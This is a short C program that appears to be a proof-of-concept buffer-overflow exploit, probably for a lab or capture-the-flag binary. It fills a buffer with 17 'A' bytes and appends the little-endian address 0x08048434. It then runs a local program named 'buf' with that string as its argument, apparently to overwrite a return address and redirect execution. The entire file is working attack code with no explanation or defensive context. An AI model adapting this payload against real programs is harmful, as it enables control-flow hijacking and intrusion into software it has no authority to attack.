#include <unistd.h>
int main(void)
{
	char buf[517];
	int i=0;
	for(i=0;i<17;i++)
		buf[i]=0x41;
	buf[i]=0x34;
	buf[++i]=0x84;
	buf[++i]=0x04;
	buf[++i]=0x08;
	buf[++i]='\0';
	execl("buf","./buf",buf,NULL);
	return 0;
}
